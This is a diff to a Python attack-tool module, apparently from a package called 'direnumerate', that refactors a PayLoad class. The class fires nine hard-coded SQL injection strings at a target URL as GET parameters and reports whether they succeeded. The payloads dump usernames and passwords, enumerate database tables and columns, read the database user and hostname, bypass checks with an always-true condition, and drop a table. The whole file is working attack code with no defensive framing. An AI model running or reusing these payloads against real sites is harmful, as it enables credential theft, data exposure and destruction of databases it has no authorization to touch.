@@ -1,6 +1,8 @@
 import requests
 import socket
 import os
+import webbrowser
+from typing import Optional
 
 from direnumerate.createlist import create_wordlist
 from direnumerate.colors import Color
@@ -69,90 +71,98 @@ class PortScan:
             sock.close()
 
 class PayLoad:
-    def __init__(self, 
-                 url, 
-                 rocket1: bool = False,
-                 rocket2: bool = False,
-                 rocket3: bool = False,
-                 rocket4: bool = False,
-                 rocket5: bool = False,
-                 rocket6: bool = False,
-                 rocket7: bool = False,
-                 rocket8: bool = False,
-                 rocket9: bool = False,):
-
-                 self.url = url
+    def __init__(self, url):
+                 self.url = "http://" + url
         
-    def start_inject(self):
-        """rocket launcher"""
+    def start_inject(self, 
+                    rocket1: bool = False,
+                    rocket2: bool = False,
+                    rocket3: bool = False,
+                    rocket4: bool = False,
+                    rocket5: bool = False,
+                    rocket6: bool = False,
+                    rocket7: bool = False,
+                    rocket8: bool = False,
+                    rocket9: bool = False,
+                    verbose: bool = False,
+                    term: Optional[str] = None,):
+            
+        """missile launcher"""
 
-        rocket1 = {
-            'termo': "' UNION SELECT username, password FROM users --"
+        missile1 = {
+            term: "' UNION SELECT username, password FROM users --"
         }
 
-        rocket2 = {
-            'termo': "' UNION SELECT table_name, NULL FROM information_schema.tables --"
+        missile2 = {
+            term: "' UNION SELECT table_name, NULL FROM information_schema.tables --'"
         }
 
-        rocket3 = {
-            'termo': "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'tablename' --"
+        missile3 = {
+            term: "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'tablename' --"
         }
 
-        rocket4 = {
-            'termo': "' UNION SELECT field1, field2 FROM tablename --"
+        missile4 = {
+            term: "' UNION SELECT field1, field2 FROM tablename --"
         }
 
-        rocket5 = {
-            'termo': "' OR 'a'='a --"
+        missile5 = {
+            term: "' OR 'a'='a --"
         }
 
-        rocket6 = {
-            'termo': "' UNION SELECT user(), NULL --"
+        missile6 = {
+            term: "' UNION SELECT user(), NULL --"
         }
 
-        rocket7 = {
-            'termo': "' UNION SELECT @@hostname, NULL --"
+        missile7 = {
+            term: "' UNION SELECT @@hostname, NULL --"
         }
 
-        rocket8 = {
-            'termo': "' UNION SELECT user(), NULL --"
+        missile8 = {
+            term: "' UNION SELECT user(), NULL --"
         }
 
-        rocket9 = {
-            'termo': "' ; DROP TABLE nome_da_tabela --"
+        missile9 = {
+            term: "' ; DROP TABLE nome_da_tabela --"
         }
 
         if rocket1:
-            response = requests.get(self.url, params=rocket1)
+            response = requests.get(self.url, params=missile1)
             pass
         elif rocket2:
-            response = requests.get(self.url, params=rocket2)
+            response = requests.get(self.url, params=missile2)
             pass
         elif rocket3:
-            response = requests.get(self.url, params=rocket3)
+            response = requests.get(self.url, params=missile3)
             pass
         elif rocket4:
-            response = requests.get(self.url, params=rocket4)
+            response = requests.get(self.url, params=missile4)
             pass
         elif rocket5:
-            response = requests.get(self.url, params=rocket5)
+            response = requests.get(self.url, params=missile5)
             pass
         elif rocket6:
-            response = requests.get(self.url, params=rocket6)
+            response = requests.get(self.url, params=missile6)
             pass
         elif rocket7:
-            response = requests.get(self.url, params=rocket7)
+            response = requests.get(self.url, params=missile7)
             pass
         elif rocket8:
-            response = requests.get(self.url, params=rocket8)
+            response = requests.get(self.url, params=missile8)
             pass
         elif rocket9:
-            response = requests.get(self.url, params=rocket9)
+            response = requests.get(self.url, params=missile9)
             pass
 
         if "search results" in response.text:
-            print(Color.RED + "SQL injection performed successfully!" + Color.RESET)
+            if verbose:
+                print(response.text)
+                print("term -> ", term)
+                pass
+            print(Color.GREEN + "SQL injection performed successfully!" + Color.RESET)
    
-            print(response.text)
         else:
-            print(Color.GREEN + "SQL injection didn't work." + Color.RESET)
+            if verbose:
+                print(response.text)
+                print("term -> ", term)
+                pass
+            print(Color.RED + "SQL injection didn't work." + Color.RESET)
